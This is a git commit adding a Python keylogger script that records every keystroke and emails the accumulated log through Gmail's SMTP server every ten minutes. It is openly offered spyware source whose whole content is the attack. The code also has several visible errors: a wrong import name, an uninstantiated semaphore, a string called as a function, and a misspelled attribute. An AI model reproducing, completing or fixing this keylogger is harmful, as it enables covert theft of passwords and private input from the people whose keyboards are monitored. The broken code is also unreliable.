5496142ecb7e8a04d46c4ae8c250659c28d23f58
Hasan Parasteh <hasanparasteh@gmail.com>
2020-10-03 16:25:59 +0000

    init

---
+++ keylogger.py
@@ -0,0 +1,52 @@
+import keyboard
+import smtplib
+
+from threading import Semaphore, Time
+
+
+SEND_REPORT_EVERY=600
+EMAIL_ADDRESS=""
+EMAIL_PASSWORD=""
+
+class Keylogger:
+    def __init__(self, interval):
+        self.interval = interval
+        self.log = ''
+        self.semaphore = Semaphore
+
+    def callback(self, event):
+        name = event.name
+        if len(name) > 1:
+            if name == "space":
+                name = " "
+            elif name == "enter":
+                name = "[ENTER]\n"
+            elif name == "decimal":
+                name = "."
+            else:
+                name = name.replace(" ", "_")
+                name = f"[{name.upper()}]"
+        self.log += name
+
+    def sendmail(self, email, password, message):
+        server = smtplib.SMTP(host="smtp.gmail.com", port=587)
+        server.starttls()
+        server.login(email, password)
+        server.sendmail(email, email, message)
+        server.quit()
+
+    def report(self):
+        if self.log():
+            self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
+        self.log = ''
+        Timer(interval=self.interval, function=self.report).start()
+
+    def start(self):
+        keyboard.on_release(callback=self.callback)
+        self.report()
+        self.seaphore.acquire()
+
+
+if __name__ == '__main__':
+    keylogger = Keylogger(interval=SEND_REPORT_EVERY)
+    keylogger.start()
